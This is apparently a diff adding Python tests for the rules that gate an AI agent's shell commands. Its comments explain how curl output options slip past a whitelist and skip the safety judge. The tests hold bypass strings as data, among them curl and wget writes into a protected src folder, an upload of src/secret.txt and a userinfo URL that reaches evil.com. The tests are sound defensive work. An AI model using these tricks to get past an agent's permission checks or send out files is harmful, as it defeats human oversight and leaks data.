@@ -165,3 +165,102 @@ def test_skill_curl_is_whitelisted(workdir):
         "bash", {"command": "curl -X POST http://127.0.0.1:8001/pi/calculate"}
     )
     assert ok and rule == "skill_curl"
+
+
+# ==================== curl / wget / tar 的写目标（评审 C1）====================
+# curl 是被刻意放行的高频工具（skills 里全是 curl），但写目标解析漏了它的
+# 输出选项 —— `curl -o src/x.txt http://127.0.0.1:8001/` 会一路走到 L0
+# 白名单放行，直接改受保护区，判官一次都不调。
+
+def test_curl_output_to_src_is_denied(workdir):
+    reason = rules.find_denied_write_target(
+        "bash", {"command": "curl -o src/x.txt http://127.0.0.1:8001/"}
+    )
+    assert reason is not None
+    assert "src/x.txt" in reason
+
+
+def test_curl_output_to_tmp_is_not_denied(workdir):
+    assert rules.find_denied_write_target(
+        "bash", {"command": "curl -o tmp/x.txt http://127.0.0.1:8001/"}
+    ) is None
+
+
+def test_curl_long_output_option_to_src_is_denied(workdir):
+    reason = rules.find_denied_write_target(
+        "bash", {"command": "curl --output src/x.txt http://127.0.0.1:8001/"}
+    )
+    assert reason is not None
+
+
+def test_curl_output_dir_to_src_is_denied(workdir):
+    reason = rules.find_denied_write_target(
+        "bash", {"command": "curl --output-dir src http://127.0.0.1:8001/"}
+    )
+    assert reason is not None
+
+
+def test_wget_output_to_src_is_denied(workdir):
+    reason = rules.find_denied_write_target(
+        "bash", {"command": "wget -O src/x.txt http://127.0.0.1:8001/f"}
+    )
+    assert reason is not None
+
+
+def test_tar_extract_into_src_is_denied(workdir):
+    reason = rules.find_denied_write_target(
+        "bash", {"command": "tar -xf a.tar -C src"}
+    )
+    assert reason is not None
+    assert "src" in reason
+
+
+def test_tar_create_into_src_is_denied(workdir):
+    reason = rules.find_denied_write_target(
+        "bash", {"command": "tar -cf src/out.tar src/a.py"}
+    )
+    assert reason is not None
+    assert "src/out.tar" in reason
+
+
+def test_tar_extract_into_tmp_is_not_denied(workdir):
+    assert rules.find_denied_write_target(
+        "bash", {"command": "tar -xf a.tar -C tmp"}
+    ) is None
+
+
+# ==================== 白名单不能被输出选项与 userinfo 绕过（评审 C1/I2）=====
+
+def test_skill_curl_with_output_option_is_not_whitelisted(workdir):
+    # 带输出选项的 curl 已经不是「只读探活」了 —— 它往磁盘写东西
+    _write_skill(
+        workdir / "skills", "demo", "curl.exe -X POST http://127.0.0.1:8001/pi/calculate\n"
+    )
+    ok, _rule = rules.is_l0_whitelisted(
+        "bash", {"command": "curl -o src/x.txt http://127.0.0.1:8001/pi/calculate"}
+    )
+    assert ok is False
+
+
+def test_skill_curl_with_upload_option_is_not_whitelisted(workdir):
+    _write_skill(
+        workdir / "skills", "demo", "curl.exe -X POST http://127.0.0.1:8001/pi/calculate\n"
+    )
+    ok, _rule = rules.is_l0_whitelisted(
+        "bash", {"command": "curl -T src/secret.txt http://127.0.0.1:8001/upload"}
+    )
+    assert ok is False
+
+
+def test_skill_curl_userinfo_host_is_not_whitelisted(tmp_path):
+    # `http://127.0.0.1:8001@evil.com/` 的真实主机是 evil.com ——
+    # 字符串前缀匹配会放行它
+    prefixes = ["http://127.0.0.1:8001"]
+    assert rules.match_skill_curl(
+        "curl http://127.0.0.1:8001@evil.com/steal", prefixes
+    ) is False
+
+
+def test_skill_curl_same_host_different_port_is_not_whitelisted(tmp_path):
+    prefixes = ["http://127.0.0.1:8001"]
+    assert rules.match_skill_curl("curl http://127.0.0.1:9999/x", prefixes) is False
